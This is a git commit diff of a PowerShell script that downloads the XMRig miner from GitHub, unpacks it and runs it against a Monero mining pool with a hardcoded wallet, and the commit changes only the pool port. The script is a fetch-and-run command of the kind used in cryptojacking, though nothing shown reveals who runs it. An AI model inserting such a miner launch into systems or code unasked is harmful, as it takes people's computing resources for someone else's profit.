903c6af2ffea3e6e94c9a111d11e42fdcebca904
Lachine <86872452+Lachine1@users.noreply.github.com>
2024-10-15 14:01:03 +0200

    Update windows.ps1

--- windows.ps1
+++ windows.ps1
@@ -1,3 +1,3 @@
 Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip" -OutFile "xmrig.zip"
 Expand-Archive xmrig.zip
-.\xmrig\xmrig-6.21.3\xmrig.exe -o xmr-eu1.nanopool.org:10030 -u 4BCzRFseZPce3GUMsqGEHjeSgzzBhE3C72JdGdapz3kgdWpq4ri7NbNfTKCotSdAP2a6c6f4Qq3XHWRMJX1EYJnrDrSeJG3 --cpu-priority 4
+.\xmrig\xmrig-6.21.3\xmrig.exe -o xmr-eu1.nanopool.org:10300 -u 4BCzRFseZPce3GUMsqGEHjeSgzzBhE3C72JdGdapz3kgdWpq4ri7NbNfTKCotSdAP2a6c6f4Qq3XHWRMJX1EYJnrDrSeJG3 --cpu-priority 4
